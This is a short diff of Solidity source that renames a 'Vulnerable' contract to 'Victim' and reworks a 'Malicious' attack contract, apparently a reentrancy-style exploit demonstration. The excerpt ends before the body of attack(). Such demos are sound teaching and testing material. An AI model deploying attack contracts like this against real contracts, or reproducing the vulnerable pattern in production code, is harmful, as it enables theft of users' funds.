@@ -1,6 +1,6 @@
 pragma solidity ^0.4.18;
 
-contract Vulnerable{
+contract Victim{
   mapping (address => uint) private userBalances;
   mapping (address => bool) private claimedBonus;
   mapping (address => uint) private rewardsForA;
@@ -32,16 +32,18 @@ contract Vulnerable{
    }
 }
 
+
 pragma solidity ^0.4.18;
+import './Victim.sol';
 
 contract Malicious{
-  address private  _owner;
-  address private  vul;
+  address private _owner;
+  Victim vul;
+  uint public count = 0;
 
  //initial the attack contract with the vulnerable address
- function Malicious(address _vulAddr){ 
+ function Malicious(){ 
   _owner=msg.sender;
-  vul=_vulAddr;
  }
  
  function attack(){
